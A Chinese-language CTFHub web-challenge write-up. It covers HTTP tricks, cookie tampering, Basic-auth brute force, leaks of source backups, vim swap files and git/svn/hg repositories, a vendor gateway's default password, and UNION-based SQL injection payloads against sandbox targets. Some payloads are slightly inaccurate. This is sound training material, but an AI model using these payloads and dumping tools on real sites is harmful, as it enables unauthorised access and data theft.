> 边刷题边学知识...
>

# HTTP协议
## 请求方式
当客户端与手机端发送请求时会使用到各种各样的HTTP请求方法：

> [https://www.runoob.com/http/http-methods.html](https://www.runoob.com/http/http-methods.html)
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641617741697-8a22fbb9-a722-441d-b780-0c6dcc40a454.png)

其中最常见的就是GET方法和POST方法了，他俩最明显的区别就是在发送请求时前者会在URL中加入参数来请求，后者则是将参数进行了隐藏。当然了除了这九种以外的请求方法还可以进行自定义：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618000052-a1da850a-0a55-46c2-9917-d20fe623c95d.png)

环境启动后访问对应的网址：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618040802-37ed870b-4786-4b8c-92fe-e485c3895c01.png)

上面提示我们若使用CTFHUB方法发送请求则会得到flag，这就简单了使用burp进行抓包，然后将下图中的GET方法改为CTFHUB放包即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618211349-8b2b33ba-53b4-4d03-9046-61ace07d7327.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618253881-b326ee30-3251-4ec8-b277-a8ef997b79e9.png)

`ctfhub{90584b6cd1f3a35108e3bf9b}`

> 请求方法时区分大小写的，不要写为ctfhub。
>

## 302跳转
302是HTTP的状态码：

> [https://www.runoob.com/http/http-status-codes.html](https://www.runoob.com/http/http-status-codes.html)
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618613840-3debd909-9adb-4d71-806c-d2125d3a0ef6.png)

3**系列主要用来重定向，其中的302重定向含义为当访问一个URL时会临时跳转到另一个URL上。我们以本题为例。使用浏览器直接访问URL，显示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641618924273-e02b01a9-ce66-4c57-a804-c9eabf804c63.png)

然后我们点击`Give me Flag`链接，结果还是跳转到了上面这个界面，此时我们查看一下浏览器的网络情况（F12）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641619117228-4e463247-4caf-4fbc-b39a-c24068c08181.png)

发现其访问了一个index.php，在burp中`send to repeater`进行查看得到flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641619244781-7156e8ef-06c5-4115-a4fd-72f5e42cfa89.png)

`ctfhub{25b35cb35cfd14e97e860833}`

## Cookie
在维基百科上对cookie的定义如下：[https://zh.wikipedia.org/wiki/Cookie](https://zh.wikipedia.org/wiki/Cookie)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641619743315-8eeaad38-c6a4-4a60-a6e6-d5f1bba00c18.png)

可以看到cookie的作用之一就是辨别用户身份，但是由于它存放在本地所以在服务器不经校验的情况下我们可以进行越权。开启环境：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620049183-6ef09195-be48-486a-b21f-b08f79dd5a71.png)

上来就提示我们只有admin才能拿到flag，先F12看一波：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620113760-c5753f16-fbe7-4a4b-91b1-99dcd6be61f1.png)

可以看到cookie中admin的值为0，我们将其改为1之后刷新页面即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620184011-2333bb07-ee3b-408a-893b-c4cbf4fd8dc1.png)

`ctfhub{db5ca147f26f7335ff18520f}`

## 基础认证
题目提示我们访问[https://zh.wikipedia.org/wiki/HTTP基本认证](https://zh.wikipedia.org/wiki/HTTP基本认证)来获取有关的学习资料，并且还在附件中给我们了一些常见的字典：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620409020-2fb67636-532b-4607-85ab-0e6c8de653dd.png)

看来需要去爆破了，我们访问靶机：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620459883-045d1a9a-b7d8-46e3-aab0-f0119345ed45.png)

点击click发现需要账号密码：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620543059-a9a243b6-a7d7-4e0c-b42b-26dc40d1edc1.png)

使用burp抓包看一下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620680806-c937993e-0b41-4d08-bf07-21fb16790d64.png)

发现提示要使用admin登录，这个和wiki百科上的相对应：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620824360-605284de-330b-4c54-861c-82d804a7c186.png)

在登录框中输入任意内容，抓包看一下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620877603-3bda2b3e-2958-4f0b-ae0e-a2d681fc19a5.png)

其中账号密码是使用Base64进行加密[http://www.hiencode.com/base64.html](http://www.hiencode.com/base64.html)：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641620937228-430e8d24-9bd7-4601-a733-00735d72432e.png)

这里我们在burp中进行爆破，发送到intruder：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621051235-4b80925d-0147-4a17-aed9-5ac451c6b704.png)

设置变量：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621330258-f949eb91-37cd-447a-8b47-8ec0e29c341b.png)

设置第一个payload为`admin:`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621749677-f4c44487-c183-431d-be7e-c05475633a33.png)

> 注意上面是`admin:`，要与验证格式对应。
>

第二个payload则是从附件下载的文件中导入：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621203807-55684e05-0fd9-4a89-a767-e290cc81bcfe.png)

设置base64加密：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621261583-93e3c8b4-21e8-4d17-bb07-3a501132c561.png)

最后取消勾选URL编码，防止Base64中的=被编码为%3d：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621943690-97b3badc-b98a-4cd6-8592-5d6064dbe347.png)

状态为200，攻击成功：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641621831639-48064d9f-5c99-402a-8c25-1d1804997f09.png)

`YWRtaW46Nzc3Nzc3`：即账号密码为`admin`、`777777`：`ctfhub{ef38e072d6a638f4a5f15f94}`

## 响应包源代码
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641622617581-e832d6e5-31b7-4cd6-8a84-8a0d69813bdd.png)

按下F12就有flag：`ctfhub{f634baeaaf884db3c0e676c3}`

# 信息泄露
## 目录遍历
直接开启靶机：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641623474292-74a85c4b-0faf-4690-9635-c8787a5241c8.png)

可以在`flag_in_here/1/3/`找到flag.txt：`ctfhub{a0aeeed35fc7b17841a6c940}`

也可以写一个python脚本帮助我们遍历：

```c
import requests
url = "http://challenge-b29ac82df5a7b31e.sandbox.ctfhub.com:10800/flag_in_here"

for i in range(4):
    for j in range(4):
        request_url=url + "/" +str(i) + "/" + str(j)
        r= requests.get(request_url)
        r.encoding = "utf-8"
        file = r.text
        if("flag.txt" in file):
            print("success!")
            print(request_url)
            break
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641623991587-9d1fa701-6070-4963-8c8c-b9ab94798b3a.png)

## PHPINFO
phpinfo里直接有flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641624188974-7de6503c-1ae2-4b5c-8f42-c5649e321111.png)`ctfhub{d1e9091c9ecc48886e30947e}`

## 备份文件下载
### 网站源码
> 当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。
>

运行环境：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641624711780-2faf913b-fc3a-4732-b113-cddf143c5bac.png)

使用后台扫描工具可以有如下连接：`[http://challenge-f50299f1427c9688.sandbox.ctfhub.com:10800/www.zip](http://challenge-f50299f1427c9688.sandbox.ctfhub.com:10800/www.zip)`，下载解压之后有三个文件

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626067587-dfa1fea7-998d-4ff4-8ba5-f4f364d80dcb.png)

但是没有flag，可以访问`网址+flag_298674125.txt`得到flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626138239-bd523dca-8f9b-4e58-9849-b993daf9fc47.png)

`ctfhub{7a03d49dd17596948e522b2c}`

### bak文件
访问靶机：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626262238-b881de10-afb3-474e-9ef5-09cc06421c62.png)

尝试访问`http://challenge-0f6671e504775379.sandbox.ctfhub.com:10800/index.php`无果。因为本题为bak文件，尝试访问：

`http://challenge-0f6671e504775379.sandbox.ctfhub.com:10800/index.php.bak`得到bak文件，打开即可有flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626395986-51c08987-74fd-462a-b396-aaefb98cfda1.png)

`ctfhub{aed932e9dbb362c6cb36cd9d}`

### vim缓存
原来vim也能泄露东西，长见识了...

> 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626567103-8c3aae72-ddf2-45dd-ac18-a89aea04aa67.png)

**<font style="color:#E8323C;">非正常关闭vim编辑器时会生成一个.swp文件，在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</font>**

以 index.php 为例：第一次产生的交换文件名为`.index.php.swp`，再次意外退出后将会产生名为`.index.php.swo`的交换文件，第三次产生的交换文件则为`.index.php.swn`。

我们访问：`http://challenge-021b8c2c341cd8ce.sandbox.ctfhub.com:10800/.index.php.swp`下载`index.php.swp`文件，可以使用`<font style="color:rgb(77, 77, 77);">vim -r </font>index.php.swp`来恢复该文件：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626817308-636b5110-c700-4240-8368-61cb6b6fb44e.png)

`ctfhub{eeca8a77e438115636796547}`

或者可以使用vscode直接打开：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641626915764-ad7092f2-ddc3-4da3-a56f-8f625929a6b8.png)

### .DS_Store
> .DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。
>

我现在才知道这个文件的作用，之前都没有查过...

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641627095855-cfaf80cf-606a-4ba7-bb08-2298a6ab863e.png)

根据提示，访问`.DS_Store`文件：`http://challenge-3ddade604e85492a.sandbox.ctfhub.com:10800/.DS_Store`，下载得到DS_Store文件，直接打开是乱码。下载工具`Python-dsstore`：[https://github.com/gehaxelt/Python-dsstore](https://github.com/gehaxelt/Python-dsstore)，然后进行解析即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641627604220-985080f9-8342-4d40-8a6d-c52ba500d852.png)

发现文件：`62fcf3c8f6deee573952d4acc2d36c60.txt`，访问可以得到flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641627637048-e540b4fc-b500-4b46-94f7-35b152a3fe23.png)

`ctfhub{4f7e1cd358a7407fc03f1a83}`



## Git泄露
### Log
> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。
>
> git我自己之前用过，现在不怎么用了；git目录下包含了大量的信息，若没有部署好则可能泄露。。。
>

git作用可以看下面的图：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641630300039-d86b5892-8987-4170-84d8-bafffc425440.png)

看到题目提示，访问：[https://github.com/BugScanTeam/GitHack](https://github.com/BugScanTeam/GitHack)下载工具，访问靶机：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641629714513-76cab38b-bed0-41c6-a1ae-c6dbbc2eb03f.png)

首先使用工具进行文件泄露（工具要求为python2）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641630009370-b27bceb0-5971-434a-ba58-1e23b4019014.png)

文件保存在如下目录：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641630107518-bd3211bc-158d-4487-9b31-733fda0c95e5.png)

如上图所示，git文件夹为隐藏文件夹，在此目录下使用`git log`查看历史记录：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641630326652-a0ab9b08-b28e-42f0-9f8e-cc4fbacb470b.png)

当前的版本已经remove掉了flag文件，我们可以将两次提交记录进行对比，获取flag的内容：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641630457946-5b8fabb0-9861-400a-8abe-f08fe6c9c0c7.png)

`ctfhub{52e07107c41c72d622bb5ddd}`

### Stash
开发的项目的过程中会出现不同的分支。比如dev分支、master分支等，当你在dev分支开发新功能时突然有人给你反馈一个bug让你修复，但是新功能做到了一半你又不想提交，这时就可以使用git stash命令先把当前进度保存起来，然后切换到另一个分支去修改bug，修改完提交后，再切回dev分支，使用`git stash pop`来恢复之前的进度继续开发新功能，这个就是git中stash的作用。

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641631135489-08e9b14e-7161-4f84-93ab-db548f9cb911.png)

和之前相同，首先泄露git：`python GitHack.py http://challenge-361d49b795d6bdef.sandbox.ctfhub.com:10800/.git/`:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641631230837-78c4d0a6-0229-47c7-b513-23f17cf7c715.png)

然后进入到对应的git文件夹，使用`git stash pop`命令恢复之前的进度即恢复之前删除掉的flag文件：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641631392349-615f7d74-01ce-448e-9d83-f47cb93e3ca8.png)

此时会生成一个文件，该文件的内容就是flag：`ctfhub{4e73f0724138f5a706808796}`。

### Index
> Git本地库中的索引Index就是一个二进制文件，默认存储在.git/index路径下。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。
>

和之前一样还是首先用工具dump文件，dump下来直接有flag文件...

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641644134825-daa4941c-1363-4363-9d7e-75792950834f.png)

`ctfhub{534faeb93f6de866f8e5e5b3}`

## SVN泄露
> 当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。
>

访问靶场的提示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641646670948-93191207-e1cc-4a87-b997-ab1c8f052e0d.png)

这里选择使用dirsearch进行目录扫描：[https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)，下载完成执行`python3 setup.py install`安装，目录扫描结果保存在上级目录的dirsearch_log.txt中：

`python3 dirsearch.py -u [http://challenge-49fd721b91f90aa9.sandbox.ctfhub.com:10800/](http://challenge-49fd721b91f90aa9.sandbox.ctfhub.com:10800/) > ../dirsearch_log.txt`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641647075133-d28691d9-40bd-4d03-b3b0-d2a64cea5ba6.png)

日志中很明显有`.svn`隐藏文件说明发生了svn泄露，和之前的git泄露一样，这里我们需要下载一个dump工具`dvcs-ripper`[https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641647420595-0e3fd03b-2ce9-4147-8831-9dea2f36951f.png)

这里我们需要用到的是`rip-svn.pl`，执行`./rip-svn.pl -u http://challenge-49fd721b91f90aa9.sandbox.ctfhub.com:10800/`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641647776977-846942dd-74b7-4a20-b6a7-9b8181c23527.png)

此时会在此文件夹下生成一个隐藏文件夹：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641647851596-b0e74c82-8ae9-4d5f-862e-83d1a882f32c.png)

稍微寻找就能发现flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641648059878-6b93a640-07bf-40ff-a1f0-3a94c1fc8e2d.png)

`ctfhub{97b2b39531e6378ffc0b0b39}`

## HG泄露
> 当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。
>

这里仍需要使用到SVN中下载的工具，不过这里使用的是`rip-hg.pl`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641648278453-0dbc21de-2c36-4a46-a41f-1c7b5b900c8d.png)

执行命令`./rip-hg.pl -v -u http://challenge-c0ca2cc614e9ddb9.sandbox.ctfhub.com:10800/.hg/`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641648804830-d85d735f-7cae-4dac-8b2c-499669ff95d5.png)

进入./hg文件夹，在fncache文件夹中找到`data/flag_2890631830.txt.i`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641648938449-c234f8ac-f131-44ab-9075-badc9fd0e6ab.png)

访问可以有flag： `http://challenge-c0ca2cc614e9ddb9.sandbox.ctfhub.com:10800/flag_2890631830.txt`：`ctfhub{122b7320ede832c13350e638}`

# 密码口令
## 弱口令
由于账号密码都不知道，所以直接抓包爆破即可，详见DVWA:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641696718539-ab3faad1-6fc8-4a76-b404-0e4710815d5b.png)

我只开始用的是之前的top100的密码附件，但是似乎不行，看了网上的账号为`admin`、密码为`admin888`...

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698058862-a4572db4-59e0-4763-8311-6b57dfd2b680.png)

自己爆破为`admin`、`admin123`：`ctfhub{dfd045f39f9157c8bd962fe5}`，payload设置如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698136525-dee46ed2-a6af-45e9-a9d4-5b0b9c7a2d06.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698154961-1228ff2c-4314-4e36-907c-195fe2d8e2fc.png)

## 默认口令
开环境：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698403807-ec6e10d1-d527-4fd0-8bdb-7e0bd66034b9.png)

上百度直接搜“亿邮邮件网关默认账号密码”:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698595963-190a027b-6c89-4905-9f2d-ccb4d430e169.png)

账号密码为：`eyougw`、`admin@(eyou)`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641698876025-74337d01-8375-453a-8309-677630084b11.png)

`ctfhub{e30800ddcae5f7ebd6511058}`

# SQL注入
## 整数型注入
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641798467892-c00f7753-bc98-45a5-8327-665f4e05a858.png)

> 注意这道题报错没有回显
>

查询当前的表中有几个字段：`?id=-1 union order by 3`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641798940256-c005c04c-c73b-4e23-a669-93ee13d85e53.png)

没有回显，说明有两个字段，查询表中的字段分别是什么和其具体位置：`?id=-1 union select 1,2`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641798725520-c3714e4f-815f-42fa-a0aa-c5437a307ac4.png)

查询用户的数据库当前在的数据库和用户：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641799084530-3535f9e0-bad8-4ac2-9c60-73bc1f8563b1.png)

查询所有数据库名称：`?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641799473103-e6ade706-55b4-408f-b191-62b39fa6b14e.png)

查询sqli数据库中的所有表:`?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' `

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641799686590-115b07ae-56a4-49b5-8613-e65123ba2628.png)

获取flag表中的所有字段：

`?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='sqli'`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641801912594-61ac51b8-8d42-41a6-8abb-2abae9d9811d.png)

得到flag字段，获取它:`?id=-1 union select 1,group_concat(flag) from flag`:

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1641800167563-13357fcd-a506-4c9b-bfc8-5f7ab693df71.png)

`ctfhub{ffc2b0022acf76d079c196df}`

## 字符型注入
> 本题报错没有回显
>

和之前的相同：

`?id=1'`无回显

`?id=1''`正常回显

`?id=-1' or '1' and '1`正常回显

`?id=1' order by 3 --+ `报错，则该表中字段数为2

`?id=-1' union select 1,2 --+`该表中的ID、data的字段顺序为第一个和第二个

`?id=-1' union select user(),database() --+`用户名为root、表所处的数据库名为sqli（没有直接返回表名的函数）

`?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' --+ `（获取该数据库中的所有表：flag,id,data）

`?id=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' --+  `（获取flag表的字段：flag）

`?id=-1' union select 1,flag from flag --+ `:`ctfhub{531aa69814b1de55ae069e76}`

> 要理解sql语句每一句话的含义，这样很容易做题
>

